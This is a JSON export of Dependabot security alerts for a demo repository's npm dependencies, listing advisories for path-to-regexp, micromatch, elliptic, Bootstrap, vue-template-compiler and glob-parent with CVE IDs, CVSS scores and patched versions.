[OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-9wv6-86v2-598j",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-45296",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45296"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/925ac8e3c5780b02f58cbd4e52f95da8ad2ac485"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/d31670ae8f6e69cbfd56e835742195b7d10942ef"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/commit/f1253b47b347dcb909e3e80b0eb2649109e59894"
          },
          {
            "url": "https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0"
          },
          {
            "url": "https://security.netapp.com/advisory/ntap-20250124-0001"
          },
          {
            "url": "https://github.com/advisories/GHSA-9wv6-86v2-598j"
          }
        ],
        "published_at": "2024-09-09T20:19:15Z",
        "updated_at": "2025-01-24T21:32:30Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "path-to-regexp"
            },
            "severity": "high",
            "vulnerable_version_range": "< 0.1.10",
            "first_patched_version": {
              "identifier": "0.1.10"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "path-to-regexp"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 0.2.0, < 1.9.0",
            "first_patched_version": {
              "identifier": "1.9.0"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "path-to-regexp"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 2.0.0, < 3.3.0",
            "first_patched_version": {
              "identifier": "3.3.0"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "path-to-regexp"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 7.0.0, < 8.0.0",
            "first_patched_version": {
              "identifier": "8.0.0"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "path-to-regexp"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 4.0.0, < 6.3.0",
            "first_patched_version": {
              "identifier": "6.3.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "score": 7.7
          }
        },
        "epss": {
          "percentage": 0.00131,
          "percentile": 0.34004
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "path-to-regexp"
        },
        "severity": "high",
        "vulnerable_version_range": "< 0.1.10",
        "first_patched_version": {
          "identifier": "0.1.10"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/150",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/150",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:20Z"
    },
    {
      "number": 149,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "micromatch"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-952p-6rrq-rcjv",
        "cve_id": "CVE-2024-4067",
        "summary": "Regular Expression Denial of Service (ReDoS) in micromatch",
        "description": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-952p-6rrq-rcjv",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-4067",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4067"
          },
          {
            "url": "https://github.com/micromatch/micromatch/issues/243"
          },
          {
            "url": "https://github.com/micromatch/micromatch/pull/247"
          },
          {
            "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4067"
          },
          {
            "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448"
          },
          {
            "url": "https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0"
          },
          {
            "url": "https://github.com/micromatch/micromatch/pull/266"
          },
          {
            "url": "https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade"
          },
          {
            "url": "https://advisory.checkmarx.net/advisory/CVE-2024-4067"
          },
          {
            "url": "https://github.com/micromatch/micromatch/releases/tag/4.0.8"
          },
          {
            "url": "https://github.com/advisories/GHSA-952p-6rrq-rcjv"
          }
        ],
        "published_at": "2024-05-14T18:30:54Z",
        "updated_at": "2024-08-28T13:12:27Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "micromatch"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 4.0.8",
            "first_patched_version": {
              "identifier": "4.0.8"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00366,
          "percentile": 0.57823
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "micromatch"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 4.0.8",
        "first_patched_version": {
          "identifier": "4.0.8"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/149",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/149",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:20Z"
    },
    {
      "number": 148,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-49q7-c7j4-3p7m",
        "cve_id": "CVE-2024-42461",
        "summary": "Elliptic allows BER-encoded signatures",
        "description": "In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because BER-encoded signatures are allowed.",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-49q7-c7j4-3p7m",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-42461",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-42461"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/317"
          },
          {
            "url": "https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11"
          },
          {
            "url": "https://github.com/advisories/GHSA-49q7-c7j4-3p7m"
          }
        ],
        "published_at": "2024-08-02T09:31:35Z",
        "updated_at": "2024-08-15T17:52:30Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "elliptic"
            },
            "severity": "low",
            "vulnerable_version_range": ">= 5.2.1, <= 6.5.6",
            "first_patched_version": {
              "identifier": "6.5.7"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:U",
            "score": 2.7
          }
        },
        "epss": {
          "percentage": 0.01429,
          "percentile": 0.79653
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-347",
            "name": "Improper Verification of Cryptographic Signature"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "severity": "low",
        "vulnerable_version_range": ">= 5.2.1, <= 6.5.6",
        "first_patched_version": {
          "identifier": "6.5.7"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/148",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/148",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 147,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-977x-g7h5-7qgw",
        "cve_id": "CVE-2024-42460",
        "summary": "Elliptic's ECDSA missing check for whether leading bit of r and s is zero",
        "description": "In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because there is a missing check for whether the leading bit of r and s is zero.",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-977x-g7h5-7qgw",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-42460",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-42460"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/317"
          },
          {
            "url": "https://github.com/indutny/elliptic/commit/b6ff1758d9a6d1a7aec177ff6df9f586492a6315"
          },
          {
            "url": "https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11"
          },
          {
            "url": "https://github.com/advisories/GHSA-977x-g7h5-7qgw"
          }
        ],
        "published_at": "2024-08-02T09:31:35Z",
        "updated_at": "2024-08-15T17:53:06Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "elliptic"
            },
            "severity": "low",
            "vulnerable_version_range": ">= 2.0.0, <= 6.5.6",
            "first_patched_version": {
              "identifier": "6.5.7"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:U",
            "score": 2.7
          }
        },
        "epss": {
          "percentage": 0.00156,
          "percentile": 0.37404
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-130",
            "name": "Improper Handling of Length Parameter Inconsistency"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "severity": "low",
        "vulnerable_version_range": ">= 2.0.0, <= 6.5.6",
        "first_patched_version": {
          "identifier": "6.5.7"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/147",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/147",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 146,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-f7q4-pwc6-w24p",
        "cve_id": "CVE-2024-42459",
        "summary": "Elliptic's EDDSA missing signature length check",
        "description": "In the Elliptic package 6.5.6 for Node.js, EDDSA signature malleability occurs because there is a missing signature length check, and thus zero-valued bytes can be removed or appended.",
        "severity": "low",
        "identifiers": [
          {
            "value": "GHSA-f7q4-pwc6-w24p",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-42459",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-42459"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/317"
          },
          {
            "url": "https://github.com/indutny/elliptic/commit/c0690b36be043ee73c1780ae4b7df48632b11cf9"
          },
          {
            "url": "https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11"
          },
          {
            "url": "https://github.com/advisories/GHSA-f7q4-pwc6-w24p"
          }
        ],
        "published_at": "2024-08-02T09:31:35Z",
        "updated_at": "2024-08-15T17:53:40Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "elliptic"
            },
            "severity": "low",
            "vulnerable_version_range": ">= 4.0.0, <= 6.5.6",
            "first_patched_version": {
              "identifier": "6.5.7"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:U",
            "score": 2.7
          }
        },
        "epss": {
          "percentage": 0.00085,
          "percentile": 0.25797
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-347",
            "name": "Improper Verification of Cryptographic Signature"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "elliptic"
        },
        "severity": "low",
        "vulnerable_version_range": ">= 4.0.0, <= 6.5.6",
        "first_patched_version": {
          "identifier": "6.5.7"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/146",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/146",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 145,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "bootstrap"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "runtime",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-vc8w-jr9v-vj7f",
        "cve_id": "CVE-2024-6531",
        "summary": "Bootstrap Cross-Site Scripting (XSS) vulnerability",
        "description": "A vulnerability has been identified in Bootstrap that exposes users to Cross-Site Scripting (XSS) attacks. The issue is present in the carousel component, where the data-slide and data-slide-to attributes can be exploited through the href attribute of an <a> tag due to inadequate sanitization. This vulnerability could potentially enable attackers to execute arbitrary JavaScript within the victim's browser.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-vc8w-jr9v-vj7f",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-6531",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6531"
          },
          {
            "url": "https://www.herodevs.com/vulnerability-directory/cve-2024-6531"
          },
          {
            "url": "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6531.yml"
          },
          {
            "url": "https://lists.debian.org/debian-lts-announce/2025/04/msg00021.html"
          },
          {
            "url": "https://github.com/advisories/GHSA-vc8w-jr9v-vj7f"
          }
        ],
        "published_at": "2024-07-11T18:31:14Z",
        "updated_at": "2025-04-14T22:07:28Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "bootstrap"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 4.0.0, <= 4.6.2",
            "first_patched_version": {
              "identifier": "5.0.0"
            }
          },
          {
            "package": {
              "ecosystem": "rubygems",
              "name": "bootstrap"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 4.0.0, <= 4.6.2",
            "first_patched_version": {
              "identifier": "5.0.0"
            }
          },
          {
            "package": {
              "ecosystem": "nuget",
              "name": "bootstrap"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 4.0.0, <= 4.6.2",
            "first_patched_version": {
              "identifier": "5.0.0"
            }
          },
          {
            "package": {
              "ecosystem": "nuget",
              "name": "bootstrap.sass"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 4.0.0, <= 4.6.2",
            "first_patched_version": {
              "identifier": "5.0.0"
            }
          },
          {
            "package": {
              "ecosystem": "composer",
              "name": "twbs/bootstrap"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 4.0.0, <= 4.6.2",
            "first_patched_version": {
              "identifier": "5.0.0"
            }
          },
          {
            "package": {
              "ecosystem": "maven",
              "name": "org.webjars:bootstrap"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 4.0.0, <= 4.6.2",
            "first_patched_version": {
              "identifier": "5.0.0"
            }
          },
          {
            "package": {
              "ecosystem": "maven",
              "name": "org.webjars.npm:bootstrap"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 4.0.0, <= 4.6.2",
            "first_patched_version": {
              "identifier": "5.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L",
            "score": 6.4
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:L/SA:L",
            "score": 5.3
          }
        },
        "epss": {
          "percentage": 0.00066,
          "percentile": 0.21011
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L",
          "score": 6.4
        },
        "cwes": [
          {
            "cwe_id": "CWE-79",
            "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "bootstrap"
        },
        "severity": "medium",
        "vulnerable_version_range": ">= 4.0.0, <= 4.6.2",
        "first_patched_version": {
          "identifier": "5.0.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/145",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/145",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 144,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "vue-template-compiler"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-g3ch-rx76-35fx",
        "cve_id": "CVE-2024-6783",
        "summary": "vue-template-compiler vulnerable to client-side Cross-Site Scripting (XSS)",
        "description": "A vulnerability has been discovered in vue-template-compiler, that allows an attacker to perform XSS via prototype pollution. The attacker could change the prototype chain of some properties such as `Object.prototype.staticClass` or `Object.prototype.staticStyle` to execute arbitrary JavaScript code. Vue 2 has reached End-of-Life. This vulnerability has been patched in Vue 3.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-g3ch-rx76-35fx",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-6783",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6783"
          },
          {
            "url": "https://www.herodevs.com/vulnerability-directory/cve-2024-6783"
          },
          {
            "url": "https://github.com/advisories/GHSA-g3ch-rx76-35fx"
          }
        ],
        "published_at": "2024-07-23T15:31:09Z",
        "updated_at": "2024-08-30T15:45:16Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "vue-template-compiler"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 2.0.0, < 3.0.0",
            "first_patched_version": {
              "identifier": "3.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",
            "score": 4.2
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00027,
          "percentile": 0.05992
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",
          "score": 4.2
        },
        "cwes": [
          {
            "cwe_id": "CWE-79",
            "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "vue-template-compiler"
        },
        "severity": "medium",
        "vulnerable_version_range": ">= 2.0.0, < 3.0.0",
        "first_patched_version": {
          "identifier": "3.0.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/144",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/144",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 143,
      "state": "auto_dismissed",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "glob-parent"
        },
        "manifest_path": "frontend/package-lock.json",
        "scope": "development",
        "relationship": "transitive"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-ww39-953v-wcq6",
        "cve_id": "CVE-2020-28469",
        "summary": "glob-parent vulnerable to Regular Expression Denial of Service in enclosure regex",
        "description": "This affects the package glob-parent before 5.1.2. The enclosure regex used to check for strings ending in enclosure containing path separator.",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-ww39-953v-wcq6",
            "type": "GHSA"
          },
          {
            "value": "CVE-2020-28469",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-28469"
          },
          {
            "url": "https://github.com/gulpjs/glob-parent/pull/36"
          },
          {
            "url": "https://github.com/gulpjs/glob-parent/blob/6ce8d11f2f1ed8e80a9526b1dc8cf3aa71f43474/index.js%23L9"
          },
          {
            "url": "https://github.com/gulpjs/glob-parent/releases/tag/v5.1.2"
          },
          {
            "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBES128-1059093"
          },
          {
            "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1059092"
          },
          {
            "url": "https://snyk.io/vuln/SNYK-JS-GLOBPARENT-1016905"
          },
          {
            "url": "https://www.oracle.com/security-alerts/cpujan2022.html"
          },
          {
            "url": "https://github.com/gulpjs/glob-parent/pull/36/commits/c6db86422a9731d4f3d332ce4a81c27ea6b0ee46"
          },
          {
            "url": "https://github.com/gulpjs/glob-parent/commit/4a80667c69355c76a572a5892b0f133c8e1f457e"
          },
          {
            "url": "https://github.com/advisories/GHSA-ww39-953v-wcq6"
          }
        ],
        "published_at": "2021-06-07T21:56:34Z",
        "updated_at": "2024-06-27T14:00:25Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "glob-parent"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 4.0.0, < 5.1.2",
            "first_patched_version": {
              "identifier": "5.1.2"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00611,
          "percentile": 0.68716
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-400",
            "name": "Uncontrolled Resource Consumption"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "glob-parent"
        },
        "severity": "high",
        "vulnerable_version_range": ">= 4.0.0, < 5.1.2",
        "first_patched_version": {
          "identifier": "5.1.2"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/143",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/143",
      "created_at": "2025-06-02T13:38:20Z",
      "updated_at": "2025-06-02T13:38:20Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": "2025-06-02T13:38:20Z"
    }
  ]
}
